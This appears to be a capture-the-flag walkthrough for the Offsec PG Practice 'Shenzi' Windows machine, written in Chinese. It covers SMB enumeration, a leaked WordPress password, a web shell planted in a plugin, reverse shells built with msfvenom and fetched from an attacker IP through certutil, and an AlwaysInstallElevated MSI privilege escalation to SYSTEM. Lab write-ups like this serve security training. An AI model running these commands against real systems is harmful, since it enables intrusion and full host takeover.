###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# Shenzi
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.208.55 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.208.55:21
Open 192.168.208.55:80
Open 192.168.208.55:135
Open 192.168.208.55:139
Open 192.168.208.55:443
Open 192.168.208.55:445
Open 192.168.208.55:5040
Open 192.168.208.55:7680
Open 192.168.208.55:3306
Open 192.168.208.55:49664
Open 192.168.208.55:49666
Open 192.168.208.55:49667
Open 192.168.208.55:49669
Open 192.168.208.55:49668
Open 192.168.208.55:49665

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.208.55/dashboard/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
445/tcp   open  microsoft-ds? syn-ack
3306/tcp  open  mysql?        syn-ack
| mysql-info: 
|_  MySQL Error: Host '192.168.45.237' is not allowed to connect to this MariaDB server
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.45.237' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

smb登入，下載`passwords.txt`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ smbclient -N -L 192.168.208.55

Sharename       Type      Comment
---------       ----      -------
IPC$            IPC       Remote IPC
Shenzi          Disk
        
┌──(kali㉿kali)-[~/pgplay]
└─$ smbclient -N //192.168.208.55/Shenzi
smb: \> dir
  .                                   D        0  Thu May 28 11:45:09 2020
  ..                                  D        0  Thu May 28 11:45:09 2020
  passwords.txt                       A      894  Thu May 28 11:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 11:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 11:45:09 2020
  why.tmp                             A      213  Thu May 28 11:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 11:45:09 2020
  
## passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```

裡面有`Wordpress`的帳號密碼，查看`http://192.168.208.55/shenzi/`可以看到下面有一個wordpress的登入，key帳號密碼之後登入，一樣修改`hello dolly`plugin
```
system($_GET['cmd']);
```

前往`192.168.208.55/shenzi/wp-content/plugins/hello.php?cmd=whoami`確認可成功
```
shenzi/shenzi
```

下載reverse並使用
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.237 lport=445 -f exe > met_445.exe

192.168.208.55/shenzi/wp-content/plugins/hello.php?cmd=certutil.exe -f -urlcache -split http://192.168.45.237/met_445.exe c:/windows/temp/met_445.exe

192.168.208.55/shenzi/wp-content/plugins/hello.php?cmd=c:/windows/temp/met_445.exe
```

等反彈之後，在`C:\Users\shenzi\Desktop`得local.txt
```
C:\Users\shenzi\Desktop>type local.txt
751d404e4c4a55d149f060ae4f662bf2
```

用`winpeas.exe`
```
C:\Users\Public\Documents>certutil.exe -urlcache -f http://192.168.45.237/winPEASx64.exe winPEAS.exe
C:\Users\Public\Documents>winPEAS.exe

����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

參考[Windows Privilege Escalation – AlwaysInstallElevated Policy](https://steflan-security.com/windows-privilege-escalation-alwaysinstallelevated-policy/)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.237 lport=139 -f msi > shell.msi 

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp139

C:\Users\Public\Documents>certutil.exe -urlcache -f http://192.168.45.237/shell.msi shell.msi

C:\Users\Public\Documents>msiexec /quiet /qn /i shell.msi
```

等反彈，在`C:\Users\Administrator\Desktop`得proof.txt
```
C:\WINDOWS\system32>whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
057ff14d0a67c29369686967c82d8a8c
```